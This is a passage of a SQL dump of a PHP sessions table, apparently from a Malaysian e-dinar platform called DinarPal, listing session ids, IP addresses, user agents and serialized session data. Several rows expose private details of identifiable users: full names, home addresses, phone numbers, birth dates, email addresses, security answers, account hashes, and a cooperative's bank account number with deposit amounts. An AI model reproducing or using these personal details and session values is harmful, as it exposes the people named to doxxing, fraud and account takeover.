username?";s:9:"me_answer";s:2:"b1";s:14:"me_unique_link";s:32:"edbab45572c72a5d9440b40bcc0500c0";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";s:0:"";s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:18:"staff@dinarpal.com";s:16:"me_register_date";s:19:"2014-12-28 07:28:05";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-22T02:12:42+08:00";s:12:"me_magic_num";s:32:"9512afcb3f0fde463ddf8e476a76be16";s:5:"ml_id";s:1:"2";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"GA";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;}'),
('9192d5ce620510e51b9b7ff5450014e2', '113.210.62.149', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461640664, ''),
('9194a48e0ed1e6de1fa9aaeb971e1b50', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232000, ''),
('91a88129b5b716f30884ea8e0f60db0e', '176.10.99.201', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 1461898470, ''),
('91a9ada75c2fa904780d82947075102d', '113.210.63.76', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461655247, 'a:1:{s:15:"flash:old:error";s:24:"Wrong username/password!";}'),
('91bd25ff26ca6656daed302b95552813', '115.134.161.155', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461318913, ''),
('91f665873f5f074c303cd555ddb4494a', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461422006, ''),
('91fd77579e1d701943fedf0eb23c4975', '180.76.15.157', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461436409, ''),
('92251bfcac7cea211bad6606a951661a', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2;', 1461676558, ''),
('9234172e87c5c84dd3127074edc07d5d', '113.210.60.46', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461429236, ''),
('9234c1a05f3b0bdad23f5767e97260b2', '180.76.15.8', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461698558, ''),
('9235f0d047c72e012ac99532190d41a3', '113.210.60.46', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461429470, ''),
('926f73d8d70f85ca9467871bbf9de419', '66.249.66.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461894873, ''),
('9295c5f12a0e58e7353d14781076fd45', '180.76.15.158', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461198895, ''),
('92a563ac915db1f8b3cc53272ff164f1', '66.249.64.175', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461785898, ''),
('92d964dc950d406cca6c36e50cebd81d', '180.76.15.5', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461730658, ''),
('92e5cc952259de403d49564538ce6254', '113.210.55.79', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461587361, ''),
('935591aeb6da062d2c8f386a31a96c07', '180.76.15.12', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461763205, ''),
('935f48d42662013be14ad7d3148d7ae9', '180.76.15.158', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461274790, ''),
('93ba7f11c110e4c76e67a14f716980eb', '175.139.86.43', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461739462, 'a:68:{s:5:"me_id";s:2:"50";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"donbara87";s:11:"me_lastname";s:9:"donbara87";s:11:"me_username";s:9:"donbara87";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:9:"donbara87";s:14:"me_unique_link";s:32:"2c23e362eaa4ad718167eb637387f982";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:27:"aizuddin.zulkafli@gmail.com";s:16:"me_register_date";s:19:"2016-04-27 14:43:36";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"e37ab5bc3577a81c33f5fbb88fbda974";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:10:"me_is_amil";s:2:"no";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;s:11:"img_deposit";s:0:"";s:11:"arr_deposit";s:0:"";s:7:"de_code";s:16:"UqZfbuYEjMywRklI";s:16:"admin_account_no";s:14:"04042010006119";s:18:"admin_account_name";s:31:"Koperasi DinarPal Melaka Berhad";s:9:"de_amount";d:222.3319999999999936335370875895023345947265625;s:11:"tr_datetime";s:19:"2016-04-27 14:56:50";s:11:"deposit_fee";d:2.20000000000000017763568394002504646778106689453125;s:7:"gst_tax";d:0.13200000000000000621724893790087662637233734130859375;s:8:"tr_notes";s:0:"";s:12:"gs_sub_total";d:200;s:11:"gs_discount";i:0;s:6:"gs_fee";d:2;s:6:"gs_gst";d:0.11999999999999999555910790149937383830547332763671875;s:11:"gs_datetime";s:19:"2016-04-27 15:06:24";s:7:"gs_amil";s:21:"DP System HQ Dinarpal";}'),
('941a4b8c061f26be7d1a37c4162c73af', '66.249.66.66', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461894651, ''),
('9431a308fe8e6226c3ae28006865a9a6', '66.249.64.245', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461772441, ''),
('943cf094580ef3c5040a3440028a3146', '62.210.170.165', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461755766, ''),
('944117f68bb6a44f643d0812e1a11855', '124.13.211.11', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/53', 1461919917, ''),
('94665f67df01d583991d950527401399', '175.139.86.43', 'WhatsApp/2.16.2/i', 1461747352, 'a:1:{s:12:"me_id_parent";s:8:"BTEKOg==";}'),
('947804391024ed2cd4308ae66780fe58', '178.255.215.70', 'Mozilla/5.0 (compatible; Exabot/3.0; +http://www.e', 1461627352, ''),
('94e7896f0ecdbb40dd1d5651bd2c31c1', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461525531, ''),
('94fd77048d081c0c6b467b7676a0dcb6', '222.186.34.155', '0', 1461288453, ''),
('952acf099aaac89cb9149d578a9481a5', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461733939, ''),
('952f073f3aa109bb6e111011f789c046', '180.76.15.142', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461465717, ''),
('95323b29826b0115bf6196211eca5067', '175.136.140.216', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-G313HZ Build', 1461904968, 'a:51:{s:5:"me_id";s:2:"54";s:8:"me_image";s:36:"3ccd0fa92bd651e88aca13c10435785c.jpg";s:12:"me_firstname";s:7:"Shafira";s:11:"me_lastname";s:7:"Fatihah";s:11:"me_username";s:11:"Shafira1609";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:11:"Shafira1609";s:14:"me_unique_link";s:32:"3408eb5ace21bfc89dab4656b8e001b3";s:11:"me_address1";s:23:"no 1 felda bukit bading";s:8:"me_city1";s:16:"kuala terengganu";s:9:"me_state1";s:8:"malaysia";s:12:"me_postcode1";s:5:"21810";s:11:"me_country1";s:10:"terengganu";s:11:"me_address2";s:23:"no 1 felda bukit bading";s:8:"me_city2";s:16:"kuala terengganu";s:9:"me_state2";s:8:"malaysia";s:12:"me_postcode2";s:5:"21810";s:11:"me_country2";s:10:"terengganu";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:10:"0136331420";s:13:"me_birth_date";s:10:"1992-09-16";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:24:"- Nur Shafira Fatihah - ";s:10:"me_twitter";s:1:"-";s:12:"me_instagram";s:1:"-";s:13:"me_googleplus";s:1:"-";s:14:"me_whatsapp_no";s:10:"0136331420";s:11:"me_telegram";s:10:"0136331420";s:9:"me_wechat";s:1:"-";s:8:"me_email";s:27:"shafira_fatihah09@yahoo.com";s:16:"me_register_date";s:19:"2016-04-29 11:41:23";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-29T11:43:13+08:00";s:12:"me_magic_num";s:32:"08b8c8a50c943da7df70c8bbe9ba0c22";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"2";s:10:"me_is_amil";s:2:"no";s:9:"logged_in";b:1;}'),
('953f7f8d22aa361f1636a3e45466e84a', '54.157.10.203', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko', 1461133076, ''),
('954e031f51747afacfe66555d4738867', '123.246.120.73', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461468307, ''),
('956f96180a76f371c7a4393801565821', '115.134.161.155', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (K', 1461220691, ''),
('958811578dcfcf899e9ef56c6bac4f32', '208.184.112.74', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1;', 1461910289, ''),
('9595b2f73f7941a3360ee2e90c4fe834', '5.9.89.170', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461935054, ''),
('95b80d465f41808a2e4efa66d0bfd9e0', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461430336, ''),
('95bac447a6c3b0ab623a3ce948b63915', '162.210.196.98', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461921108, ''),
('95bb125980bd500b6fe2bcecea12752d', '180.76.15.134', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461918254, ''),
('95c38126d6e55042c4a3ef924f18cd79', '13.92.241.115', 'semanticbot', 1461739111, ''),
('95fedf57aa0c4be7f200718c2f935001', '180.76.15.25', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461217110, ''),
('9693b95e31f79480abba4b4a6e6f6063', '113.210.62.149', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461637934, ''),
('96b1c788d731804446d2ff65bfd54253', '66.249.69.4', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461541827, ''),
('96f193680627c6436323a45f9f718df4', '66.249.64.41', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461797731, ''),
('9701b1d42fe375c4ba01d304adbf3e44', '180.76.15.6', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461210185, ''),
('97093ad5480ad16fd0df02a12489c63c', '113.210.62.47', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461423838, ''),
('972d38b06041045f3fe088625077870b', '180.76.15.144', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461788725, ''),
('976146abca4515090c0d5e01dba74bb1', '180.76.15.5', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461914508, ''),
('97a9073192ed4a24c2cfe6fb34536619', '157.55.39.73', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461469461, ''),
('9823ffe1305cc62bc4a9b4df4cfad4d0', '180.76.15.11', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461886048, ''),
('986f139061002519da84761649635846', '180.76.15.28', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461745515, ''),
('98a1884356d41de3724ef65d186efe23', '115.134.161.155', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461206882, 'a:51:{s:5:"me_id";s:1:"3";s:8:"me_image";s:42:"6d3ac-adeq-nur---ftmk!-20150212_151603.jpg";s:12:"me_firstname";s:9:"Nur Umira";s:11:"me_lastname";s:7:"Mustafa";s:11:"me_username";s:3:"nur";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:3:"nur";s:14:"me_unique_link";s:32:"b55178b011bfb206965f2638d0f87047";s:11:"me_address1";s:44:"J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.";s:8:"me_city1";s:10:"AYER KEROH";s:9:"me_state1";s:6:"MELAKA";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"MALAYSIA";s:11:"me_address2";s:28:"91, JALAN KERAI, SG. RETANG.";s:8:"me_city2";s:8:"JERANTUT";s:9:"me_state2";s:6:"PAHANG";s:12:"me_postcode2";s:5:"27000";s:11:"me_country2";s:8:"MALAYSIA";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:10:"0136420142";s:13:"me_birth_date";s:10:"1993-05-18";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:33:"https://www.facebook.com/nurumira";s:10:"me_twitter";s:28:"https://twitter.com/nurumira";s:12:"me_instagram";s:29:"http://instagram.com/nurumira";s:13:"me_googleplus";s:30:"http://googleplus.com/nurumira";s:14:"me_whatsapp_no";s:10:"0199737579";s:11:"me_telegram";s:1:"-";s:9:"me_wechat";s:1:"-";s:8:"me_email";s:18:"nurumira@gmail.com";s:16:"me_register_date";s:19:"2015-04-27 03:12:49";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-20T23:44:39+08:00";s:12:"me_magic_num";s:32:"69c0e639c71a34bb6b710f043138f7f8";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"2";s:9:"logged_in";b:1;s:12:"me_id_parent";s:1:"1";}'),
('98a921880142f9413e2e7d03f6741799', '113.210.62.13', 'Mozilla/5.0 (Linux; Android 5.0; SM-N9005 Build/LR', 1461598600, 'a:1:{s:15:"flash:old:error";s:24:"Wrong username/password!";}'),
('98f8f2e3f708b03e6ce462a97ccd27f7', '183.171.169.242', 'Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LR', 1461725655, ''),
('998f044a3c389b3fc16985321830689c', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461708591, ''),
('99dbb70cbe124b7c1d48ad2ac9556305', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160557, ''),
('99f31ffab74e597f460d8d9754f2fce9', '216.145.11.94', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.', 1461257073, ''),
('99fab75e2812bc42c73e1b69f000e013', '66.249.66.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461894784, ''),
('9a263a486e881c23927973d7b83cf422', '124.13.189.132', 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/', 1461412778, 'a:1:{s:12:"me_id_parent";s:88:"79jFpE6rust5NY9TpEIxjG0VSaNaIPx68mjBwqkeJIWtn9Y_523Ayxtl7TXHtPhXSzZ4pfEKZ8Q4NADA7SH-Xw==";}'),
('9a2d8a33cbeae0c24ae31e725a313443', '180.76.15.134', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461778209, ''),
('9a6c12a2560361f79d9dc46ee8d6518b', '40.77.167.93', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461801174, ''),
('9a7d5431165e04905832fc46f08a6b55', '180.76.15.142', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461853470, ''),
('9a8eb714e1a11dcfe890e873bdc9b252', '180.76.15.148', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461734143, ''),
('9aa01ff53aa97fb52ad082009ef81ed1', '115.164.210.248', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac ', 1461489622, 'a:61:{s:5:"me_id";s:2:"40";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"bangtih82";s:11:"me_lastname";s:9:"bangtih82";s:11:"me_username";s:9:"bangtih82";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:9:"bangtih82";s:14:"me_unique_link";s:32:"4a39d4d40bd3ba6e588af660104fae12";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:20:"doodey5329@gmail.com";s:16:"me_register_date";s:19:"2016-04-24 17:17:52";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"1e3c9532960fe3f4ba4941619f117d3d";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;s:11:"img_deposit";s:0:"";s:11:"arr_deposit";s:0:"";s:7:"de_code";s:16:"9oIfzo6YPRs3tEbc";s:16:"admin_account_no";s:14:"04042010006119";s:18:"admin_account_name";s:31:"Koperasi DinarPal Melaka Berhad";s:9:"de_amount";d:252.1200000000000045474735088646411895751953125;s:11:"deposit_fee";s:4:"2.00";s:7:"gst_tax";d:0.11999999999999999555910790149937383830547332763671875;s:8:"tr_notes";s:16:"E dinar dinarpal";s:12:"me_id_parent";s:88:"SY7Zk04D3RYL8rbZKHjVyKFzdshassZZ522OpuR9Y-7z-z7pJH9BKAsnTTMSaDhoyh1HHBiUFwWpvhmPE6lEVw==";}'),
('9ae04b8a6aada9453a237b2f9efe0ece', '210.186.220.210', 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac ', 1461409714, 'a:1:{s:12:"me_id_parent";s:1:"1";}'),
('9b0b9e7704ff63b2ac0f16eb674e76b5', '216.55.186.43', '0', 1461288516, ''),
('9b3454d4654adb30e8b035780679b3b5', '62.210.74.137', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 1461672040, ''),
('9b38859f27f7e0aeb7b09a2c7fdcc006', '180.76.15.152', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461694394, ''),
('9b67540b2d0c4fff3abf4f4d44eb62f1', '66.249.77.8', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461205506, ''),
('9bbaf7e16afa8da9d556757dec742947', '173.252.115.5', 'facebookexternalhit/1.1', 1461407983, 'a:1:{s:12:"me_id_parent";s:88:"yWSxvo2DWKhkZ_U0J2Xjf7fPMU36wZ9Dks2a88Msi0W11eeqsuDbHWQyvG_T8b4l0ELu_YFQN-T5rvI3D-L4JA==";}'),
('9bfe723a8a21bd7073d5e39a78a0d3cf', '180.76.15.19', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461484105, ''),
('9c1437b44b2b1d6e3a90ca96583d643c', '220.181.108.121', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461416866, ''),
('9c89bab9b1a06c502df43acd30c3372a', '118.100.20.170', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-N915F Build/', 1461482612, 'a:2:{s:12:"me_id_parent";s:88:"Qc2aJsMyOBnVCQMdVc4SFfqR_V3OlfAuLbL3b6u2Y1TilOd41iYe6rsND79zKey6uS6hqN0_gBlk5W1ch-aelg==";s:15:"flash:old:error";s:112:"Password validation failure ( your choise is weak ) <br /><br />Password must include at least one symbol!<br />";}'),
('9ca1d2d824afa639e9b5767f0f46e02d', '175.136.140.216', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-G313HZ Build', 1461904969, 'a:51:{s:5:"me_id";s:2:"54";s:8:"me_image";s:36:"3ccd0fa92bd651e88aca13c10435785c.jpg";s:12:"me_firstname";s:7:"Shafira";s:11:"me_lastname";s:7:"Fatihah";s:11:"me_username";s:11:"Shafira1609";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:11:"Shafira1609";s:14:"me_unique_link";s:32:"3408eb5ace21bfc89dab4656b8e001b3";s:11:"me_address1";s:23:"no 1 felda bukit bading";s:8:"me_city1";s:16:"kuala terengganu";s:9:"me_state1";s:8:"malaysia";s:12:"me_postcode1";s:5:"21810";s:11:"me_country1";s:10:"terengganu";s:11:"me_address2";s:23:"no 1 felda bukit bading";s:8:"me_city2";s:16:"kuala terengganu";s:9:"me_state2";s:8:"malaysia";s:12:"me_postcode2";s:5:"21810";s:11:"me_country2";s:10:"terengganu";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:10:"0136331420";s:13:"me_birth_date";s:10:"1992-09-16";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:24:"- Nur Shafira Fatihah - ";s:10:"me_twitter";s:1:"-";s:12:"me_instagram";s:1:"-";s:13:"me_googleplus";s:1:"-";s:14:"me_whatsapp_no";s:10:"0136331420";s:11:"me_telegram";s:10:"0136331420";s:9:"me_wechat";s:1:"-";s:8:"me_email";s:27:"shafira_fatihah09@yahoo.com";s:16:"me_register_date";s:19:"2016-04-29 11:41:23";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-29T12:42:48+08:00";s:12:"me_magic_num";s:32:"08b8c8a50c943da7df70c8bbe9ba0c22";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"2";s:10:"me_is_amil";s:2:"no";s:9:"logged_in";b:1;}'),
('9ca2d7dc37a91837e222da16702a33b7', '113.210.50.40', 'WhatsApp/2.16.13 A', 1461405341, 'a:2:{s:12:"me_id_parent";s:1:"0";s:15:"flash:new:error";s:33:"Opss! Invalid member unique link.";}'),
('9ccbac03448fc0047d26c3001365eb83', '115.164.56.24', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461744126, 'a:51:{s:5:"me_id";s:1:"7";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:5:"arash";s:11:"me_lastname";s:5:"arash";s:11:"me_username";s:5:"arash";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:5:"arash";s:14:"me_unique_link";s:32:"81b9a3538d93a7623ad0e9bf1347d137";s:11:"me_address1";s:15:"DinarPal Street";s:8:"me_city1";s:10:"Ayer Keroh";s:9:"me_state1";s:6:"Melaka";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"Malaysia";s:11:"me_address2";s:15:"DinarPal Street";s:8:"me_city2";s:10:"Ayer Keroh";s:9:"me_state2";s:6:"Melaka";s:12:"me_postcode2";s:5:"75450";s:11:"me_country2";s:8:"Malaysia";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:11:"60166707888";s:13:"me_birth_date";s:10:"1977-01-19";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:0:"";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:22:"arash.private@live.com";s:16:"me_register_date";s:19:"2016-04-23 17:41:44";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-27T15:13:56+08:00";s:12:"me_magic_num";s:32:"248dfd4fff3169f86edec2930684bfd4";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:10:"me_is_amil";s:2:"no";s:9:"logged_in";b:1;}'),
('9d484532e7ecdef864215d6b9e1b6ee1', '180.76.15.31', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461711357, ''),
('9d6bc895471ee7b7ed5b42d13e62e135', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461742270, ''),
('9d74c796c9566f9854927bdf97b79aeb', '13.92.241.115', 'semanticbot', 1461739136, ''),
('9d80832862ae3964aee723d152b32324', '180.76.15.159', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461676931, ''),
('9dbfd7db85c78ad1c80685dcb9169c27', '180.76.15.163', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461835238, ''),
('9dda9a47024959e4bc0d06ba0cbc55ed', '66.249.69.68', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461661017, ''),
('9de3b7f0afa8bfd8415810ecb2d17349', '198.204.240.2', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; r', 1461565904, ''),
('9e2e981f39776d62d8374c6db04badf8', '180.76.15.161', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461745584, ''),
('9e2fa93f5f86563bc268f338390b4ef9', '1.9.155.203', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebK', 1461485220, 'a:2:{s:12:"me_id_parent";s:88:"3qS1lAuToMbkEMeo4iryH0yqI4HGDleDtLkGThs5tYS0_LtzBbBx4wLzKn58nGmdPPUOShdi2c86n0-uBNOHqg==";s:15:"flash:old:error";s:112:"Password validation failure ( your choise is weak ) <br /><br />Password must include at least one letter!<br />";}'),
('9e76a6c55887115279bf3866a8bb067b', '180.76.15.6', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461246504, ''),
('9e780179be2fa469a32e762cb105e93b', '183.171.26.121', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461815832, 'a:1:{s:12:"me_id_parent";s:8:"UGUJPg==";}'),
('9e9507bef78759d3a8954f2b45937032', '180.76.15.158', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461727399, ''),
